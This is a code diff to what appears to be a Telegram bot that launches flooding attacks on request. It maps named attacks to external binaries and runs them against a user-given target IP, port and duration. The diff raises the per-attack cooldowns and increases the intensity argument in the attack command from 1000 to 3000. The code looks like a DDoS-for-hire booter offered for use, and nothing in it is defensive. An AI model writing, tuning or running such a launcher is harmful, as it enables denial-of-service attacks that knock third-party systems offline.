@@ -24,11 +24,11 @@ USER_FILE = "users.txt"
 
 # Cooldowns and binaries for each attack
 attack_cooldowns = {
-    'attack1': {'cooldown': 20, 'last_used': None, 'binary': 'sharp'},
-    'attack2': {'cooldown': 30, 'last_used': None, 'binary': 'soul1'},
-    'attack3': {'cooldown': 10, 'last_used': None, 'binary': 'soul'},
-    'attack4': {'cooldown': 10, 'last_used': None, 'binary': 'soul2'},
-    'attack5': {'cooldown': 10, 'last_used': None, 'binary': 'soul3'}
+    'attack1': {'cooldown': 240, 'last_used': None, 'binary': 'sharp'},
+    'attack2': {'cooldown': 130, 'last_used': None, 'binary': 'soul1'},
+    'attack3': {'cooldown': 110, 'last_used': None, 'binary': 'soul'},
+    'attack4': {'cooldown': 110, 'last_used': None, 'binary': 'soul2'},
+    'attack5': {'cooldown': 110, 'last_used': None, 'binary': 'soul3'}
 }
 
 # Global variables
@@ -122,7 +122,7 @@ def handle_attack(message):
         return
 
     # Execute the attack
-    full_command = f"./{binary} {target} {port} {time_duration} 1000"
+    full_command = f"./{binary} {target} {port} {time_duration} 3000"
     try:
         bot.reply_to(
             message,
